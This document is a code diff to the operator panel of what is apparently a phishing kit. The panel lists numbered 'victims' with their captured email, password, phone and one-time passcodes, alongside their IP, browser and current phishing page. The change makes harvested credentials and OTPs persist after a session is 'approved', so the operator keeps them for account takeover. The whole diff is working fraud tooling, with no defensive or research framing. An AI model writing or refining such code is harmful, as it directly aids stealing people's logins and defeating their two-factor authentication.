@@ -407,6 +407,8 @@
   <script>
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     let isFirstLoad = true;
+    // Store to keep all session data including approved ones
+    const allSessionsData = new Map();
     const qs = s => document.querySelector(s);
     const qsa = s => document.querySelectorAll(s);
     const fmt = t => new Date(t).toLocaleTimeString();
@@ -476,12 +478,17 @@
     /* ----------  CHANGES  ---------- */
     function checkChanges(newSessions){
       if (isFirstLoad) {
+        newSessions.forEach(s => allSessionsData.set(s.sid, {...s}));
         lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
         isFirstLoad = false;
         return;
       }
       
       newSessions.forEach(s => {
+        // Always update our persistent store with latest data
+        const existing = allSessionsData.get(s.sid) || {};
+        allSessionsData.set(s.sid, {...existing, ...s});
+        
         const old = lastSessions.get(s.sid);
         if (!old) {
           showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
@@ -541,23 +548,37 @@
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
       
-      // KEY CHANGE: Show OTP in NetCode column if on otp.html page, otherwise show phone
+      // KEY CHANGE: Merge server data with our persistent store to keep all credentials
       body.innerHTML = d.sessions.map(s => {
-        const approved = isApproved(s);
-        // Use OTP if on otp.html page and OTP exists, otherwise use phone (NetCode)
-        const netcodeValue = (s.page === 'otp.html' && s.otp) ? s.otp : (s.phone || '—');
+        // Get merged data from persistent store (preserves credentials after approval)
+        const persistentData = allSessionsData.get(s.sid) || {};
+        const mergedSession = {...persistentData, ...s};
+        
+        const approved = isApproved(mergedSession);
+        
+        // Build NetCode value: prioritize OTP if on otp.html, then phone, then stored value
+        let netcodeValue = '—';
+        if (mergedSession.page === 'otp.html' && mergedSession.otp) {
+          netcodeValue = mergedSession.otp;
+        } else if (mergedSession.phone) {
+          netcodeValue = mergedSession.phone;
+        } else if (persistentData.otp) {
+          netcodeValue = persistentData.otp;
+        } else if (persistentData.phone) {
+          netcodeValue = persistentData.phone;
+        }
         
         return `
-        <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
-          <td>${s.victimNum}</td>
-          <td><span class="cred">${s.email||'—'}</span></td>
-          <td><span class="cred">${s.password||'—'}</span></td>
+        <tr data-sid="${mergedSession.sid}" class="${approved ? 'approved' : ''}">
+          <td>${mergedSession.victimNum}</td>
+          <td><span class="cred">${mergedSession.email||'—'}</span></td>
+          <td><span class="cred">${mergedSession.password||'—'}</span></td>
           <td><span class="cred">${netcodeValue}</span></td>
-          <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
-          <td>${s.platform}</td>
-          <td>${s.browser}</td>
-          <td><div style="font-weight:600;color:${approved?'var(--green)':''}">${pageTitle(s.page)}</div>${statusText(s)}</td>
-          <td>${actionButtons(s)}</td>
+          <td><a class="ip-link" onclick="openIpLookup('${mergedSession.ip}')" title="Lookup IP">${mergedSession.ip}</a></td>
+          <td>${mergedSession.platform}</td>
+          <td>${mergedSession.browser}</td>
+          <td><div style="font-weight:600;color:${approved?'var(--green)':''}">${pageTitle(mergedSession.page)}</div>${statusText(mergedSession)}</td>
+          <td>${actionButtons(mergedSession)}</td>
         </tr>`;
       }).join('');
     }
@@ -570,8 +591,12 @@
 
     /* ----------  MODALS  ---------- */
     function showDetail(sid){
-      const s = jsonData.sessions.find(x=>x.sid===sid);
-      if(!s)return;
+      // Get from persistent store to ensure we have all data including credentials
+      const persistentData = allSessionsData.get(sid) || {};
+      const serverData = jsonData.sessions.find(x=>x.sid===sid) || {};
+      const s = {...persistentData, ...serverData};
+      
+      if(!s.sid)return;
       currentSid = sid;
       const approved = isApproved(s);
       
@@ -589,9 +614,21 @@
           </div>
         `).join('') : '<div style="color:var(--text-muted);font-size:12px;padding:8px 0">No activity recorded</div>';
       
-      // KEY CHANGE: Show OTP in NetCode field if on otp.html, otherwise show phone
-      const netcodeValue = (s.page === 'otp.html' && s.otp) ? s.otp : (s.phone || '—');
-      const netcodeLabel = (s.page === 'otp.html' && s.otp) ? 'NetCode (OTP)' : 'NetCode';
+      // Build NetCode value from persistent data
+      let netcodeValue = '—';
+      let netcodeLabel = 'NetCode';
+      
+      if (s.page === 'otp.html' && s.otp) {
+        netcodeValue = s.otp;
+        netcodeLabel = 'NetCode (OTP)';
+      } else if (s.phone) {
+        netcodeValue = s.phone;
+      } else if (persistentData.otp) {
+        netcodeValue = persistentData.otp;
+        netcodeLabel = 'NetCode (OTP)';
+      } else if (persistentData.phone) {
+        netcodeValue = persistentData.phone;
+      }
       
       qs('#modalBody').innerHTML = `
         <div class="info-grid">
@@ -616,8 +653,8 @@
             <div class="info-value mono">${netcodeValue}</div>
           </div>
           <div class="info-section">
-            <div class="info-label">OTP (if applicable)</div>
-            <div class="info-value mono">${s.otp||'—'}</div>
+            <div class="info-label">OTP (Raw)</div>
+            <div class="info-value mono">${s.otp||persistentData.otp||'—'}</div>
           </div>
           <div class="info-section full-width">
             <div class="info-label">System Information</div>
@@ -681,6 +718,7 @@
     async function executeDelete() {
       await fetch('/api/refresh', {method: 'POST'});
       lastSessions.clear();
+      allSessionsData.clear();
       isFirstLoad = true;
       closeConfirm();
       load();
@@ -702,6 +740,7 @@
     /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       lastSessions.clear();
+      allSessionsData.clear();
       isFirstLoad = true;
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
